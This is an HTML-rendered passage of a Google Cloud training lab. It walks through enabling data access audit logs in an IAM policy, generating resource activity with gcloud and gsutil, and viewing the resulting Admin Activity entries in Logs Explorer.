class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = &lt;project_id&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;/project_id&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = qwiklabs-gcp-44776a13dea667a6</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> Full documentation of </span><strong><span>gcloud</span></strong><span> is available in the </span><a href='https://cloud.google.com/sdk/gcloud'><span>gcloud CLI overview guide </span></a><span>.</span></p><h5 id='check-project-permissions'><span>Check project permissions</span></h5><p><span>Before you begin your work on Google Cloud, you need to ensure that your project has the correct permissions within Identity and Access Management (IAM).</span></p><ol start='' ><li><p><span>In the Google Cloud console, on the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), select </span><strong><span>IAM &amp; Admin</span></strong><span> &gt; </span><strong><span>IAM</span></strong><span>.</span></p></li><li><p><span>Confirm that the default compute Service Account </span><code>{project-number}-compute@developer.gserviceaccount.com</code><span> is present and has the </span><code>editor</code><span> role assigned. The account prefix is the project number, which you can find on </span><strong><span>Navigation menu &gt; Cloud overview &gt; Dashboard</span></strong><span>.</span></p></li></ol><p><img src="images\SMuu68pzAXGA%2F%2FgiwoeYr02rez30D0rBU8FvkNAciFM%3D" referrerpolicy="no-referrer" alt="Compute Engine default service account name and editor status highlighted on the Permissions tabbed page"></p><p><strong><span>Note:</span></strong><span> If the account is not present in IAM or does not have the </span><code>editor</code><span> role, follow the steps below to assign the required role.</span></p><ol start='' ><li><p><span>In the Google Cloud console, on the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>Cloud overview &gt; Dashboard</span></strong><span>.</span></p></li><li><p><span>Copy the project number (e.g. </span><code>729328892908</code><span>).</span></p></li><li><p><span>On the </span><strong><span>Navigation menu</span></strong><span>, select </span><strong><span>IAM &amp; Admin</span></strong><span> &gt; </span><strong><span>IAM</span></strong><span>.</span></p></li><li><p><span>At the top of the </span><strong><span>IAM</span></strong><span> page, click </span><strong><span>+ Grant Access</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>New principals</span></strong><span>, type:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  {project-number}-compute@developer.gserviceaccount.com</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Replace </span><code>{project-number}</code><span> with your project number.</span></p></li><li><p><span>For </span><strong><span>Select a role</span></strong><span>, select </span><strong><span>Project</span></strong><span> (or Basic) &gt; </span><strong><span>Editor</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Save</span></strong><span>.</span></p></li></ol><h4 id='task-1-enable-data-access-audit-logs'><span>Task 1. Enable data access audit logs</span></h4><p><span>In this task, you enable data access audit logs.</span></p><p><span>Data access audit logs (except for BigQuery) are disabled by default, so you must first enable all audit logs. Logging charges for the volume of log data that exceeds the free monthly logs allotment.</span></p><p><span>All logs received by Logging count towards the logs allotment limit, except for the Cloud Audit Logs that are enabled by default. This includes all Google Cloud Admin Activity audit logs, System Event logs, plus data access audit logs from BigQuery only.</span></p><ol start='' ><li><p><span>If you have not activated cloud shell yet then, on the Google Cloud Console title bar, click </span><strong><span>Activate Cloud Shell</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span>). If prompted, click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>At the command prompt, run this command to retrieve the current IAM policy for your project and save it as </span><code>policy.json</code><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud projects get-iam-policy $DEVSHELL_PROJECT_ID \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--format=json &gt;./policy.json</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click the </span><strong><span>Open Editor</span></strong><span> button to view the Cloud Shell code editor.</span></p></li></ol><p><span>If an error indicates that the code editor could not be loaded because third-party cookies are disabled, click </span><strong><span>Open in New Window</span></strong><span> and switch to the new tab.</span></p><ol start='' ><li><p><span>In the Cloud Shell code editor, click the </span><strong><span>policy.json</span></strong><span> file to expose its contents.</span></p></li><li><p><span>Add the following text to the </span><code>policy.json</code><span> file to enable data Access audit logs for all services. This text should be added just after the first </span><code>{</code><span> and before </span><code>&quot;bindings&quot;: [</code><span>. (Be careful not to change anything else in the file).</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; "auditConfigs": [</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; "service": "allServices",</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; "auditLogConfigs": [</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  { "logType": "ADMIN_READ" },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  { "logType": "DATA_READ"  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  { "logType": "DATA_WRITE" }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; ]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; ],</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 225px;"></div><div class="CodeMirror-gutters" style="display: none; height: 225px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The file will look similar to below.</span></p><p><img src="https://cdn.qwiklabs.com/PTMujGrCTlnBGI7aaNg3n3MvDMqNRFxzDY0DRBWgb6U%3D" referrerpolicy="no-referrer" alt="Contents of the policy.json file"></p><ol start='' ><li><p><span>Click the </span><strong><span>Open Terminal</span></strong><span> button to return to the Cloud Shell command line.</span></p></li><li><p><span>At the command line, run the following command to set the IAM policy:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud projects set-iam-policy $DEVSHELL_PROJECT_ID \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">./policy.json</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The command will return and display the new IAM policy.</span></p><h4 id='task-2-generate-some-account-activity'><span>Task 2. Generate some account activity</span></h4><p><span>In this task, you create resources that generate log activty that you can view in Cloud Audit logs.</span></p><ul><li><p><span>In Cloud Shell, run the following commands to create a few resources. This will generate some activity that you will view in the audit logs:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil mb gs://$DEVSHELL_PROJECT_ID</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo "this is a sample file" &gt; sample.txt</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil cp sample.txt gs://$DEVSHELL_PROJECT_ID</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks create mynetwork --subnet-mode=auto</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create default-us-vm \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type=e2-micro \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone=us-east4-c --network=mynetwork</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 158px;"></div><div class="CodeMirror-gutters" style="display: none; height: 158px;"></div></div></div></pre><p><span>Copied!</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil rm -r gs://$DEVSHELL_PROJECT_ID</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><h4 id='task-3-view-the-admin-activity-logs'><span>Task 3. View the Admin Activity logs</span></h4><p><span>In this task, you view the Admin Activity logs.</span></p><p><span>Admin Activity logs contain log entries for API calls or other administrative actions that modify the configuration or metadata of resources. For example, the logs record when VM instances and App Engine applications are created and when permissions are changed.</span></p><p><span>To view the logs, you must have the Cloud Identity and Access Management roles Logging/Logs Viewer or Project/Viewer.</span></p><p><span>Admin Activity logs are always enabled so there is no need to enable them. There is no charge for your Admin Activity audit logs.</span></p><p><strong><span>Note:</span></strong><span> You can view audit log entries in the Logs Viewer, Cloud Logging, and in the Cloud SDK. You can also export audit log entries to Pub/Sub, BigQuery, or Cloud Storage.</span></p><h5 id='use-the-cloud-logging-page'><span>Use the Cloud Logging page</span></h5><ol start='' ><li><p><span>From the Cloud Console, select </span><strong><span>Navigation menu &gt; Logging &gt; Logs Explorer</span></strong><span>.</span></p></li><li><p><span>Paste the following in the </span><strong><span>Query builder</span></strong><span> field and replace </span><code>[PROJECT_ID]</code><span> with your project ID. You can copy the </span><strong><span>PROJECT_ID</span></strong><span> from the </span><strong><span>Qwiklabs Connection Details</span></strong><span>.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">logName = ("projects/[PROJECT_ID]/logs/cloudaudit.googleapis.com%2Factivity")</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click the </span><strong><span>Run Query</span></strong><span> button.</span></p></li><li><p><span>Locate the log entry indicating that a Cloud Storage bucket was deleted. This entry will refer to </span><code>storage.googleapis.com</code><span>, which calls the </span><code>storage.buckets.delete</code><span> method to delete a bucket. The bucket name is the same name as your project id.</span></p></li><li><p><span>Within that entry, click on the </span><strong><span>storage.googleapis.com</span></strong><span> text and select </span><strong><span>Show matching entries</span></strong><span>.</span></p></li><li><p><span>Notice a line was added to the query preview textbox (located where the query builder had been) to show only storage events.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">logName = ("projects/qwiklabs-gcp-xxxxxxxxx/logs/cloudaudit.googleapis.com%2Factivity")</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">protoPayload.serviceName="storage.googleapis.com"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You should now see only the cloud storage entries.</span></p><ol start='' ><li><p><span>Within that entry, click on the </span><strong><span>storage.buckets.delete</span></strong><span> text and select </span><strong><span>Show matching entries</span></strong><span>.</span></p></li><li><p><span>Notice another line was added to the Query preview textbox and now you can only see storage delete entries.</span></p></li></ol><p><span>This technique can be used to easily locate desired events.</span></p><ol start='' ><li><p><span>In the Query results, expand the </span><strong><span>Cloud Storage delete</span></strong><span> entry and then expand the </span><strong><span>protoPayload</span></strong><span> field.</span></p></li><li><p><span>Expand the </span><strong><span>authenticationInfo</span></strong><span> field and notice you can see the email address of the user that performed this action.</span></p></li></ol><p><span>Feel free to explore other fields in the entry.</span></p><h5 id='use-the-cloud-sdk'><span>Use the Cloud SDK</span></h5><p><span>Log entries can also be read using the Cloud SDK command:</span></p><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud logging read [FILTER]</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><ul><li><p><span>In the Cloud Shell pane, use this command to retrieve only the audit activity for storage bucket deletion:</span></p></li></ul><p><strong><span>Note:</span></strong><span> If Cloud Shell is disconnected, then click </span><strong><span>reconnect</span></strong><span>.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div 